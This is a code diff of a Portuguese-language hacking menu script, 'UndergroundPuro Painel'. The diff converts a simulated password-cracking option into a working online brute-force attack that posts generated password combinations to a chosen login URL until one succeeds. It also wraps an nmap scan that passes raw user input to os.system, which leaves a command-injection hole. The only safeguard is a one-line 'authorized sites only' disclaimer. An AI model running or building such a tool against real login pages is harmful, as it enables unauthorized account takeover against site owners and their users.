@@ -1,13 +1,14 @@
-# undergroundpuro
+#undergroundpuro
 import os
 import itertools
+import requests
 from time import sleep
 from colorama import Fore, Style, init
 
-init()
+init(autoreset=True)
 
 def banner():
-    os.system('clear')
+    os.system('clear' if os.name == 'posix' else 'cls')
     print(Fore.GREEN + """
 ====================================
        UndergroundPuro Painel
@@ -15,40 +16,47 @@ def banner():
 
 def nmap():
     alvo = input(Fore.GREEN + "\n[+] Digite o IP ou domínio para escanear: " + Style.RESET_ALL)
-    os.system(f"nmap -sV {alvo}")
+    print(Fore.YELLOW + f"\n[*] Escaneando {alvo} com Nmap..." + Style.RESET_ALL)
+    os.system(f"nmap -sV -Pn {alvo}")
 
 def hydra():
-    print(Fore.GREEN + "\n[+] Modo de testes de quebra de senhas - Apenas para fins educacionais" + Style.RESET_ALL)
+    print(Fore.GREEN + "\n[+] Bruteforce Real - Use apenas em sites autorizados" + Style.RESET_ALL)
     dicas = input("[+] Dicas de senhas (separadas por vírgulas): ").split(',')
     min_chars = int(input("[+] Número mínimo de caracteres: "))
     max_chars = int(input("[+] Número máximo de caracteres: "))
-    url = input("[+] URL do alvo (exemplo: http://alvo.com/login): ")
+    url = input("[+] URL do login (ex: http://localhost/login): ")
+    campo_user = input("[+] Nome do campo de usuário (ex: username): ")
+    campo_pass = input("[+] Nome do campo de senha (ex: password): ")
+    usuario = input("[+] Nome de usuário para testar: ")
+    falha_resposta = input("[+] Palavra que indica login falhou (ex: inválido): ").lower()
 
-    print(Fore.YELLOW + "\n[*] Gerando combinações..." + Style.RESET_ALL)
-    combinacoes = set()
-
+    print(Fore.YELLOW + "\n[*] Gerando e testando combinações...\n" + Style.RESET_ALL)
+    tentativa = 0
     for i in range(min_chars, max_chars + 1):
         for combo in itertools.product(dicas, repeat=i):
-            tentativa = ''.join(combo)
-            combinacoes.add(tentativa)
-
-    print(f"\n[*] Total de combinações geradas: {len(combinacoes)}")
-
-    print(Fore.CYAN + f"\n[*] Iniciando testes na URL: {url} (modo simulado)\n" + Style.RESET_ALL)
-    for senha in list(combinacoes)[:15]:  # simular apenas 15 tentativas
-        print(f"[TESTE] Tentando senha: {senha}")
-        sleep(0.2)  # simulação
-    print(Fore.GREEN + "\n[FIM] Teste concluído (modo simulado)." + Style.RESET_ALL)
+            senha = ''.join(combo)
+            data = {campo_user: usuario, campo_pass: senha}
+            try:
+                r = requests.post(url, data=data)
+                tentativa += 1
+                if falha_resposta not in r.text.lower():
+                    print(Fore.GREEN + f"\n[SENHA ENCONTRADA] {senha} após {tentativa} tentativas!" + Style.RESET_ALL)
+                    return
+                else:
+                    print(f"[X] Tentativa {tentativa}: {senha}")
+            except Exception as e:
+                print(Fore.RED + f"[ERRO] {e}" + Style.RESET_ALL)
+    print(Fore.RED + "\n[FIM] Nenhuma senha encontrada." + Style.RESET_ALL)
 
 def bot():
-    print(Fore.CYAN + "\n[+] Bot beta ainda em construção..." + Style.RESET_ALL)
+    print(Fore.CYAN + "\n[+] Bot ainda em desenvolvimento..." + Style.RESET_ALL)
 
 def main():
     while True:
         banner()
         print(Fore.GREEN + """
-[1] Nmap (varredura de redes)
-[2] Hydra (quebra de senhas)
+[1] Nmap (varredura real de redes)
+[2] Hydra (bruteforce real de senhas)
 [3] Bot (beta)
 [0] Sair
 """ + Style.RESET_ALL)
@@ -66,7 +74,7 @@ def main():
             break
         else:
             print(Fore.RED + "\nOpção inválida!" + Style.RESET_ALL)
-        input("\nPressione ENTER para voltar ao menu...")
+        input(Fore.CYAN + "\nPressione ENTER para voltar ao menu..." + Style.RESET_ALL)
 
 if __name__ == "__main__":
-    main()# undergroundpuro
+    main()
